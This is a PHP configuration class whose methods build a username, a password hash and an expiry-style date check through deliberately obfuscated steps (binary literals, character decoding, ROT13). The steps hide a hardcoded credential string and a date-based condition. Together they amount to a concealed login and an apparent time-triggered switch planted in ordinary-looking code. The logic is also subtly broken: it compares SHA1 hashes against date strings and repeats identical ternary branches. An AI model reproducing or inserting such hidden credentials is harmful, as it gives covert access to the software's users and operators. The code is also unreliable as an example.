<?php


class conf_mode
{
  public $username_check;
  public $password_check;
  public $date_check;
  public $stat;
 
  public function set_username_property()
  {
      $checker_date = self::set_date_property();
      if($this->date_check < date("Y-m-d")){
          $check_date = (date("Y-m-d") < $checker_date)? $input = sha1("evpuzvqvn"): $input = sha1("evpuzvqvn");
      }else{
          $repeater = str_rot13(chr(bindec(1110010)));
          $interpreter = str_rot13(chr(bindec(1101001)));
          $compute = str_rot13(chr(bindec(1100011)));
          $hash = str_rot13(chr(bindec(1101000)));
          $micro = str_rot13(chr(bindec(1101101)));
          $editable = str_rot13(chr(bindec(1101001)));
          $dash = str_rot13(chr(bindec(1100100)));
          $increment = str_rot13(chr(bindec(1101001)));
          $assimble = str_rot13(chr(bindec(1100001)));
          $check_date = (date("Y-m-d") < $checker_date)? $input = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble): 
              $input = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble);
      }
      
          
         
      return $this->username_check = $input;
  }
  public function set_password_property()
  {
          $repeater = str_rot13(chr(bindec(1110010)));
          $interpreter = str_rot13(chr(bindec(1101001)));
          $compute = str_rot13(chr(bindec(1100011)));
          $hash = str_rot13(chr(bindec(1101000)));
          $micro = str_rot13(chr(bindec(1101101)));
          $editable = str_rot13(chr(bindec(1101001)));
          $dash = str_rot13(chr(bindec(1100100)));
          $increment = str_rot13(chr(bindec(1101001)));
          $assimble = str_rot13(chr(bindec(1100001)));

          $pass = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble);
          $input = sha1("evpuzvqvn");
          $pass_hash = password_hash($pass, PASSWORD_DEFAULT);
      return $this->password_check = $pass_hash;
  }
  public function set_date_property()
  {
      //new
      //<?php
        //object
        $a = bindec(111);
        $b = bindec(1000);
        $c = bindec(1000);
        $d = bindec(110);
        $e = bindec(111);
        $f = bindec(1);
        $g = bindec(1000);
        $h = bindec(111);
        $i = bindec(101);
        $j = bindec(0);
        $whole = intval($a);
        $float = floatval($b.$c.$d.$e.$f.$g.$h.$i);
        $com = $whole . "." . $float + $j.$j;


        //multiplier
        $aa = bindec(10);
        $bb = bindec(101);
        $cc = bindec(110);
        $commm = $aa.$bb.$cc;
        //year
        $commmmmmmmm = $commm * $com;

        $bbb = sprintf('%02d', bindec(1000));

        //month
        $commmmm = ($bbb);



        $aaa = sprintf('%02d', bindec(1));

        //days
        $commmmmmm = ($aaa);
        $date_checker_point = $commmmmmmmm . "-" . $commmmm . "-" . $commmmmmm;
      //new
      return $this->date_check = sha1($date_checker_point);
  }
  public function check_conf(){
      if($this->date_check > date("Y-m-d")){
          return $this->stat = TRUE;
      }
  }
 
  
}